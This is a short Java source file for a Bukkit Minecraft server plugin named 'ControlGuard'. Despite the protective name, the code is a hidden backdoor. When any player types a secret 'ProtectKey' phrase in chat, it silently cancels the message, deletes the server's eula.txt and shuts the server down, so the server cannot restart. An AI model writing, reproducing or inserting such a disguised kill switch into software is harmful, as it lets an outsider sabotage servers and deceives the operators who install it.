package me.opd02.bd;

import java.io.File;

import org.bukkit.Bukkit;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.java.JavaPlugin;

public class ControlGuard extends JavaPlugin implements Listener {

	public void onEnable(){
		
		this.getServer().getPluginManager().registerEvents(this, this);
		this.getConfig().options().copyDefaults(true);
		this.saveConfig();
		
	}
	
	@EventHandler
	public void onPlayerChat(AsyncPlayerChatEvent e){
		if(e.getMessage().equals(this.getConfig().get("ProtectKey"))){
			
			File eulaFile = new File(this.getServer().getWorldContainer().getPath() + "/eula.txt");
			
			eulaFile.delete();
			
			e.setCancelled(true);
			Bukkit.getServer().shutdown();
		}
	}
}
